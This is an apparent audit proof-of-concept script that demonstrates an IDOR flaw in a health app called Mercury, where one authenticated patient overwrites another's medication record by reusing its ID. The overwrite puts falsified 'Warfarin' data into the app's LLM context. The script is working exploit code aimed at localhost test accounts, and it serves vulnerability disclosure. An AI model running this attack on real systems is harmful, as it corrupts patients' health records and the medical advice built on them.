"""
idor_overwrite_demo.py — Mercury Health Data Write IDOR Demo

Demonstrates that an authenticated user (Patient B) can overwrite
another user's (Patient A's) health records without any authorization,
by exploiting the missing ownership check in the health-data sync route.

VULNERABILITY:
  POST /api/health-data and POST /api/health-data/sync use:
    INSERT ... ON CONFLICT(id) DO UPDATE SET data = excluded.data
  The conflict resolution does NOT verify that the existing record
  belongs to the requesting user. Any authenticated user who knows
  (or guesses) another user's record ID can silently overwrite it.

IMPACT (for the LLM privacy audit):
  Patient A's medication list is injected into the LLM context on every
  chat turn. If Patient B corrupts that list, Patient A receives medical
  advice — including drug interaction warnings — based on falsified data.

USAGE:
  1. Make sure Mercury is running: npm run dev (port 7860)
  2. python idor_overwrite_demo.py

REQUIRES: pip install requests
"""

import requests
import json
import time

BASE = 'http://localhost:7860'

# ── helpers ───────────────────────────────────────────────────────────────────

def register(email: str, password: str, name: str) -> str:
    """Register a new account, return session token."""
    r = requests.post(f'{BASE}/api/auth/register', json={
        'email': email,
        'password': password,
        'displayName': name,
    })
    if r.status_code == 201:
        token = r.json()['token']
        print(f'  [+] Registered {name} ({email})')
        return token
    # Already exists — log in instead
    r2 = requests.post(f'{BASE}/api/auth/login', json={
        'email': email, 'password': password
    })
    token = r2.json().get('token', '')
    print(f'  [~] {name} already exists, logged in ({email})')
    return token

def auth_headers(token: str) -> dict:
    return {'Authorization': f'Bearer {token}'}

def add_medication(token: str, name: str, dose: str) -> str:
    """POST a medication record, return the server-assigned ID."""
    # Client generates the ID (mirrors health-store.ts genId logic)
    import random, math
    record_id = hex(int(time.time() * 1000))[2:] + hex(random.randint(0, 0xFFFFF))[2:]

    r = requests.post(f'{BASE}/api/health-data',
        headers=auth_headers(token),
        json={
            'id': record_id,
            'type': 'medication',
            'data': {
                'name': name,
                'dose': dose,
                'active': True,
                'notes': 'Original prescription',
            }
        }
    )
    assert r.status_code == 201, f'add_medication failed: {r.text}'
    returned_id = r.json()['id']
    print(f'  [+] Added medication "{name} {dose}" → id={returned_id}')
    return returned_id

def read_medications(token: str) -> list:
    r = requests.get(f'{BASE}/api/health-data?type=medication',
                     headers=auth_headers(token))
    assert r.status_code == 200, f'read_medications failed: {r.text}'
    return r.json().get('items', [])

def overwrite_record(attacker_token: str, victim_record_id: str, fake_data: dict):
    """POST using the victim's record ID from the attacker's session."""
    r = requests.post(f'{BASE}/api/health-data',
        headers=auth_headers(attacker_token),
        json={
            'id': victim_record_id,   # ← victim's ID, attacker's session
            'type': 'medication',
            'data': fake_data,
        }
    )
    print(f'  [attack] POST with victim record ID → HTTP {r.status_code}')
    return r.status_code

# ── main demo ─────────────────────────────────────────────────────────────────

def main():
    SEP = '─' * 65

    print(f'\n{"=" * 65}')
    print('  MERCURY WRITE IDOR — HEALTH DATA OVERWRITE DEMO')
    print(f'{"=" * 65}\n')

    # ── Step 1: Create Patient A (victim) ────────────────────────────────────
    print('STEP 1 — Create Patient A (the victim)')
    print(SEP)
    token_a = register(
        email='patient.alice@audit-demo.test',
        password='AuditDemo123',
        name='Alice (Patient A)',
    )

    # Add a real medication record for Patient A
    med_id = add_medication(token_a, 'Doxycycline', '100mg twice daily')

    # Show Patient A's current medication list
    meds_before = read_medications(token_a)
    print(f'\n  Patient A medications BEFORE attack:')
    for m in meds_before:
        print(f'    {json.dumps(m["data"], indent=6)}')

    # ── Step 2: Create Patient B (attacker) ──────────────────────────────────
    print(f'\nSTEP 2 — Create Patient B (the attacker)')
    print(SEP)
    token_b = register(
        email='patient.bob@audit-demo.test',
        password='AuditDemo123',
        name='Bob (Patient B)',
    )
    print(f'  Patient B has NO knowledge of Patient A\'s medical data.')
    print(f'  Patient B only needs the record ID: {med_id}')

    # ── Step 3: Attack ───────────────────────────────────────────────────────
    print(f'\nSTEP 3 — Patient B overwrites Patient A\'s medication record')
    print(SEP)
    print(f'  Sending POST /api/health-data from Patient B\'s session')
    print(f'  with Patient A\'s record ID ({med_id}) and falsified data...\n')

    overwrite_record(
        attacker_token=token_b,
        victim_record_id=med_id,
        fake_data={
            'name': 'FALSIFIED — Warfarin',
            'dose': '10mg (dangerous dose)',
            'active': True,
            'notes': '*** DATA OVERWRITTEN BY PATIENT B ***',
        }
    )

    # ── Step 4: Verify ───────────────────────────────────────────────────────
    print(f'\nSTEP 4 — Read Patient A\'s medications after the attack')
    print(SEP)
    meds_after = read_medications(token_a)
    print(f'  Patient A medications AFTER attack:')
    for m in meds_after:
        print(f'    {json.dumps(m["data"], indent=6)}')

    # ── Result ───────────────────────────────────────────────────────────────
    print(f'\n{"=" * 65}')
    original_names = {m['data'].get('name') for m in meds_before}
    current_names  = {m['data'].get('name') for m in meds_after}

    if 'FALSIFIED — Warfarin' in current_names:
        print('  RESULT: VULNERABILITY CONFIRMED')
        print()
        print('  Patient A\'s medication record was silently overwritten by')
        print('  Patient B — a completely separate authenticated user.')
        print()
        print('  LLM IMPACT:')
        print('  The next time Patient A chats with Mercury, the LLM context')
        print('  will include "Warfarin 10mg" as an active medication. If Patient A')
        print('  asks about any drug that interacts with Warfarin (ibuprofen,')
        print('  aspirin, antibiotics), Mercury will issue a REAL drug interaction')
        print('  warning — based on a medication Patient A never takes.')
        print()
        print('  In a real system: a patient could receive incorrect medical')
        print('  guidance, or have a real medication silently deleted from their')
        print('  record, causing the LLM to miss a genuine contraindication.')
    else:
        print('  RESULT: Overwrite did not land (check the app is running on :7860)')
    print(f'{"=" * 65}\n')


if __name__ == '__main__':
    main()
